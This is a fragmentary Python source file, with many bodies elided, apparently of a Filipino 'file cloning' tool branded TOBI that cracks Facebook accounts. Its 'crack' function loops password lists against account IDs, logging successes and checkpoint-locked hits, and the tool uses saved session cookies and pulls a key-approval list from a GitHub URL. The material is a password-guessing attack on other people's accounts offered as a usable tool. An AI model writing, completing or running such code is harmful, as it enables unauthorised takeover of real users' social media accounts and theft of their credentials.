...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/TobiPHcheat/F-7/main/approved.txt').text
		ua=open('.bbnew.txt','w')
...
\033[38;5;46m|┏─────────────────────────────────────────┓
\033[38;5;46m|│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mTOBIPHCHAT
\033[38;5;46m|│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mTOBI.PHcheat.ph                
\033[38;5;46m|│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+63             
\033[38;5;46m|│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mFILE CLONING  
\033[38;5;46m|│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mtobiphcheat          
\033[38;5;46m|┗─────────────────────────────────────────┛
 \x1b[1;92m""")
os.system('clear')
banner()
...
def login_lagi334():
	try:
		...
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ LOGIN SUCCESSFUL.... \n \x1b[1;91m➣\x1b[1;96m➣\x1b[1;92m➣ TYPE \x1b[1;96mpython TOBI.py');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	try:
		...
		print(' \n\033[38;5;196m➣Cookies Expired ... \033[0;97m')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	...
	if _____MAMUN_____ in ['0']:
		...
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Successful gois 😄 ')
		back()
def error():
...
def P():
	...
	try:
		...
		print(f'{u}')
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m CHECK YOUR INTERNET CONNECTION BROHh')
		back()
	except (KeyError,IOError):
...
def passwrd():
	...
	if woi in ['y','Y']:
		...
		print(f'\t \x1b[1;91m➢\x1b[1;96m➣\033[38;5;46m|➣ Salamat sa pag gamit gois  {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;93m[TOBI-CP] {idf} | {pw}{N}')     
...
def RMX():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \033[1;38mYOUR KEY :\033[1;32m TOBI="+id)
      print('\033[1;36m┗─────────────────────────────────────────┛')
      os.system('xdg-open https://m.me/TOBI.PHcheat.ph')
      time.sleep(3)
      sys.exit()
